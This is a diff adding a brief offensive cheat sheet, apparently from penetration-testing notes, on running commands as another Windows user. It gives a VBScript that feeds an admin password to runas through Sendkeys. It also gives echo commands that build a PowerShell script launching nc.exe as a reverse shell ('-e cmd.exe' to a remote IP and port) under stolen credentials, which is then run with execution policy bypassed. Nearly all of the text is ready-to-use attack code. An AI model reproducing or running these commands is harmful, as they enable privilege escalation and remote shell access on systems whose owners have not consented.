@@ -1,0 +1,23 @@
+Windows RunAS via VBScript
+
+Replace the password with actual password, but don’t replace tilde (~)
+
+    Option explicit
+    dim oShell
+    set oShell= Wscript.CreateObject(“WScript.Shell”)
+    oShell.Run “runas /user:admin “”c:\windows\system32\cmd.exe”””
+    WScript.Sleep 100
+    oShell.Sendkeys “password~”
+    Wscript.Quit
+
+Windows RunAS via Powershell
+
+    echo $username = ‘ ‘ > startprocess.ps1
+    echo $password = ‘ ‘ >> startprocess.ps1
+    echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
+    echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
+    echo Start-Process ‘C:\Users\nikhil\nc.exe’ -ArgumentList ‘-e cmd.exe 10.xx.xx.xx 9999’ -Credential $credential >> startprocess.ps1
+
+Run the powershell script :
+
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1
